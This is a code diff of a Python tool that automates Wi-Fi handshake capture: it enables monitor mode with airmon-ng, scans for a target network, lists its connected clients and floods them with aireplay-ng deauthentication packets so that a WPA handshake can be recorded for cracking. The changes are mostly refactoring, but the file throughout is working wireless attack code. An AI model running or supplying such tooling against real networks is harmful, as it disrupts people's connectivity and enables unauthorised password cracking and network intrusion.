@@ -7,33 +7,31 @@ from difflib import get_close_matches   # for network guesses
 from termcolor import colored           # some colors for ya
 
 # Parsing values ------------------ Start
-parser = argparse.ArgumentParser(description='Automatically capture handshake')
-parser.add_argument('ssid', metavar='network_name', help='Network name')
-parser.add_argument('-i', metavar='interface', default='', help='Interface')
-parser.add_argument('--conf', metavar='confidence',type=float, default=0.6, help='Confidence in guessing network name (default = 0.6)')
-parser.add_argument('--pAm', metavar='packets', type=int, default=10, help='Amount of packets to send (default = 5)')
-parser.add_argument('--dir', metavar='directory', default='', help='Directory (default = mydir/wifis/network_name)')
-parser.add_argument('--mode', metavar='mode', default='', help='Set to pi if you are using raspberry (Raspbian OS, or if you do not use network manager)')
+parser = argparse.ArgumentParser(description="Automatically capture handshake")
+parser.add_argument("ssid", metavar="NETWORK_NAME", help="Network name")
+parser.add_argument("-i", metavar="INTERFACE", default="", help="Interface")
+parser.add_argument("--conf", metavar="CONFIDENCE", type=float, default=0.6, help="Confidence in guessing network name from 0 to 1 (default = 0.6)")
+parser.add_argument("--pack", metavar="PACKETS", type=int, default=10, help="Amount of packets to send (default = 10)")
+parser.add_argument("--dir", metavar="DIRECTORY", default="", help="Directory, in which .cap file is stored (default = mydirectory/wifis/NETWORK_NAME/)")
+parser.add_argument("--nokill", default=False, action="store_true", help="Specify if you don't want to kill processes. May not work depending upon your software/firmware")
 
 args = parser.parse_args()
 # Parsed values ------------------- End
 
 
-# Global variables ------------------------- Start
+# Parsed variables ------------------------- Start
 Interface = args.i
 SSID = args.ssid
 Confidence = args.conf  # How confident script must be in guessing network name
-DeauthPacketsAmount = args.pAm
+DeauthPacketsAmount = args.pack
 
-MY_DIRECTORY = os.popen('pwd').read()
-SaveTo = '{}/wifis/'.format(MY_DIRECTORY[:-1])
-if args.dir != '':
+MY_DIRECTORY = os.popen("pwd").read()
+SaveTo = "{}/wifis/".format(MY_DIRECTORY[:-1])
+if args.dir != "":
 	SaveTo = args.dir
 
-isPi = False
-if args.mode == 'pi':
-	isPi = True
-# Global variables ------------------------- End
+KillProcesses = not args.nokill
+# Parsed variables ------------------------- End
 
 
 # Custom functions ------------------------- Start
@@ -44,22 +42,22 @@ def select_interface(interface_name):
 	command_find_interfaces = "sudo iwconfig 2>&1 | grep -oP '^\w+'"
 	interfaces = os.popen(command_find_interfaces).read().split("\n")[:-1]
 	if len(interfaces) < 3:
-		print('[' + colored(str(dt.now().time()).split('.')[0], 'blue') + '] [' + colored('ERROR', 'red') + '] No interfaces')
+		print('[' + colored(str(dt.now().time()).split('.')[0], "blue") + "] [" + colored('ERROR', 'red') + "] No interfaces")
 		exit()
 	index = 0
 	for interface in interfaces:
 		if interface != "lo" and interface != "eth0":
 			command_set_interface_up = "sudo ifconfig {} up".format(interface)
-			string = "> /dev/null 2>&1"
 			os.popen(command_set_interface_up).read()
 			time.sleep(2)
 			Interfaces.append(interface)
 			index += 1
-	if interface_name in Interfaces and args.i != "":
-		return interface_name
-	if interface_name not in Interfaces and args.i != "":
-		print('[' + colored(str(dt.now().time()).split('.')[0], 'blue') + '] [' + colored('ERROR', 'red') + '] No such interface {}'.format(interface_name))
-		exit()
+	if args.i != "":
+		if interface_name in Interfaces:
+			return interface_name
+		else:
+			print('[' + colored(str(dt.now().time()).split('.')[0], "blue") + "] [" + colored("ERROR", "red") + "] No such interface {}".format(interface_name))
+			exit()
 
 	if len(Interfaces) > 1:
 		while interface_name == "":
@@ -73,7 +71,7 @@ def select_interface(interface_name):
 			if len(Interfaces) > InterfaceIndex:
 				return Interfaces[InterfaceIndex]
 			else:
-				print('[' + colored(str(dt.now().time()).split('.')[0], 'blue') + '] [' + colored('WARNING', 'yellow') + '] You picked the wrong house fool')
+				print('[' + colored(str(dt.now().time()).split('.')[0], "blue") + "] [" + colored("WARNING", "yellow") + "] You picked the wrong house fool")
 	else:
 		InterfaceIndex = 0
 		return Interfaces[0]
@@ -97,10 +95,8 @@ def monitor_mode(interface_name):
 
 
 def start_network_manager():
-	command_network_manager_start = 'sudo systemctl start NetworkManager'
-	command_dhcpcd_start = 'sudo systemctl start dhcpcd 2>&1'
-	if os.popen(command_dhcpcd_start).read() == "Unit dhcpcd.service could not be found.\n":
-		os.popen(command_network_manager_start).read()
+	if "Unit dhcpcd.service" in os.popen("sudo systemctl start dhcpcd 2>&1").read():
+		os.popen("sudo systemctl start NetworkManager").read()
 
 
 def start_airmon(interface_name, kill_wifi):
@@ -109,7 +105,7 @@ def start_airmon(interface_name, kill_wifi):
 	interface_phy = get_phy_by_name(interface_name)
 	os.popen("sudo airmon-ng start {}".format(interface_name)).read()
 	interface_new = get_name_by_phy(interface_phy)
-	print('[' + colored(str(dt.now().time()).split('.')[0], 'blue') + '] [' + colored('INFO', 'green') + '] Changed interface: {}'.format(interface_new))
+	print("[" + colored(str(dt.now().time()).split(".")[0], "blue") + "] [" + colored("INFO", "green") + "] Changed interface: {}".format(interface_new))
 	return interface_new
 
 
@@ -117,13 +113,13 @@ def stop_airmon(interface_name):
 	interface_phy = get_phy_by_name(interface_name)
 	os.popen("sudo airmon-ng stop '{}'".format(interface_name)).read()
 	interface_new = get_name_by_phy(interface_phy)
-	print('[' + colored(str(dt.now().time()).split('.')[0], 'blue') + '] [' + colored('INFO', 'green') + '] Changed interface: {}'.format(interface_new))
+	print('[' + colored(str(dt.now().time()).split('.')[0], "blue") + "] [" + colored("INFO", "green") + "] Changed interface: {}".format(interface_new))
 	return interface_new
 
 
 def get_network_info(interface_name, network_name, guessing_confidence):
-	BSSID = ''
-	Channel = ''
+	BSSID = ""
+	Channel = ""
 	output_scan_wifi = os.popen("""sudo iwlist {} scan | egrep 'ESSID:|Address:|Channel:' | cut -d : -f 2,3,4,5,6,7,8 | tr -d '"' | sed 's/ //g' 2>&1""".format(interface_name)).read()
 		
 	splited_output_scan_wifi = output_scan_wifi.split("\n")
@@ -135,7 +131,7 @@ def get_network_info(interface_name, network_name, guessing_confidence):
 	del splited_output_scan_wifi[len(splited_output_scan_wifi)-1]
 
 	if not splited_output_scan_wifi:
-		print('[' + colored(str(dt.now().time()).split('.')[0], 'blue') + '] [' + colored('ERROR', 'red') + '] No networks found. IF you see an unstyled error above, disconnecting any network might help.')
+		print("[" + colored(str(dt.now().time()).split('.')[0], "blue") + "] [" + colored("ERROR", "red") + "] No networks found. If you see 'Device or resource busy' or 'Resource temporarily unavailable' error above, disconnecting any network and closing network manager window might help.")
 		exit()
 
 	wifiNames = []
@@ -156,10 +152,10 @@ def get_network_info(interface_name, network_name, guessing_confidence):
 		closeMatch = get_close_matches(network_name, wifiNames, 1, Confidence)[0]
 		BSSID = splited_output_scan_wifi[splited_output_scan_wifi.index(closeMatch)-2]
 		Channel = int(splited_output_scan_wifi[splited_output_scan_wifi.index(closeMatch)-1])
-		print('[' + colored(str(dt.now().time()).split('.')[0], 'blue') + '] [' + colored('WARNING', 'yellow') + "] No such network '{}', assuming you typed '{}'".format(network_name, closeMatch))
+		print('[' + colored(str(dt.now().time()).split('.')[0], "blue") + "] [" + colored("WARNING", "yellow") + "] No such network '{}', assuming you typed '{}'".format(network_name, closeMatch))
 		return [closeMatch, BSSID, Channel]
 	except IndexError:
-		print('[' + colored(str(dt.now().time()).split('.')[0], 'blue') + '] [' + colored('ERROR', 'red') + '] Error scanning for network (network name is incorrect)')
+		print('[' + colored(str(dt.now().time()).split('.')[0], "blue") + "] [" + colored("ERROR", "red") + "] Error scanning for network (network name is incorrect)")
 		exit()
 
 
@@ -170,11 +166,12 @@ def start_airodump(interface_name, BSSID, channel, directory):
 
 def fill_stations_from_csv(directory):
 	stations = []
-	with open('{}-01.csv'.format(directory), 'r') as csvfile:
+	with open("{}-01.csv".format(directory), 'r') as csvfile:
 		for idx, val in enumerate(csvfile):
 			if idx + 1 > 5:
-				if val.split(',')[0] != "\n":
-					stations.append(val.split(',')[0])
+				v = val.split(',')[0]
+				if v != "\n" and v != "\r\n":
+					stations.append(v)
 	return stations
 
 
@@ -188,7 +185,7 @@ def select_station(stations, current_station_address):
 
 
 def deauthNetwork(interface_name, BSSID, station, deauth_packets):
-	command_aireplay = 'sudo aireplay-ng --ignore-negative-one --deauth {} -a {} -c {} {} > /dev/null 2>&1'.format(deauth_packets, BSSID, station, interface_name)
+	command_aireplay = "sudo aireplay-ng --ignore-negative-one --deauth {} -a {} -c {} {} > /dev/null 2>&1".format(deauth_packets, BSSID, station, interface_name)
 	deauthProcess = subprocess.Popen(command_aireplay, shell=True).wait()
 
 
@@ -202,7 +199,7 @@ def make_directory(directory, network_name):
 				if index >= 2:
 					directory_path = directory_path[:-1]
 				directory_path = directory_path[:-1]
-				directory_path += str(index) + "/"
+				directory_path += str(index) + '/'
 				index += 1
 			os.makedirs(directory_path)
 	else:
@@ -241,8 +238,8 @@ def check_for_stations(directory):
 			# check output
 			stations = fill_stations_from_csv(directory)
 			if len(stations) > 0:
-				current_station_address = select_station(stations, '')
-				print('[' + colored(str(dt.now().time()).split('.')[0], 'blue') + '] [' + colored('INFO', 'green') + '] Stations: {}'.format(stations))
+				current_station_address = select_station(stations, "")
+				print('[' + colored(str(dt.now().time()).split('.')[0], "blue") + "] [" + colored("INFO", "green") + "] Stations: {}".format(stations))
 				return stations, current_station_address
 		index += 1
 		time.sleep(3.0 - ((time.time() - startTime) % 3.0))
@@ -297,5 +294,5 @@ def recieveHandshake(interface_name, network_name, directory, guessing_confidenc
 if __name__ == "__main__":
 	Interface = select_interface(Interface)
 	print('[' + colored(str(dt.now().time()).split('.')[0], 'blue') + '] [' + colored('INFO', 'green') + '] Interface: {}'.format(Interface))
-	recieveHandshake(Interface, SSID, SaveTo, Confidence, DeauthPacketsAmount, not isPi)
+	recieveHandshake(Interface, SSID, SaveTo, Confidence, DeauthPacketsAmount, KillProcesses)
 # MAIN ---------------------------------- END
